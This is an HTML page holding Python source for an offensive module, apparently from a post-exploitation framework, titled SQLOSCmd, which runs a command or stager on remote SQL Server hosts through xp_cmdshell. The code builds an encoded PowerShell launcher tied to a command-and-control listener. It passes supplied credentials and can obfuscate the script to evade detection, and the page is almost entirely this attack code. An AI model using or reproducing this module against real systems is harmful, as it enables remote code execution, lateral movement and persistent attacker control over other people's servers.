<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SQLOSCmd</title>
</head><body>Executes a command or stager on remote hosts using xp_cmdshell<br/>
Does not need Admin<br/>
<br/>
moduleCode = ""<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if obfuscate:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; try:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with open(moduleSource, 'r') as source:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; moduleCode = source.read()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; except:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print helpers.color("[!] Could not read module source path at: " + str(moduleSource))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return ""<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script = moduleCode<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if command == "":<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if not self.mainMenu.listeners.is_listener_valid(listenerName):<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print helpers.color("[!] Invalid listener: " + listenerName)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return ""<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if launcher == "":<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return ""<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; scriptEnd = "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command) &nbsp;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if username != "":<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; scriptEnd += " -UserName "+username<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if password != "":<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; scriptEnd += " -Password "+password<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if obfuscate:<br/>
scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)</body></html>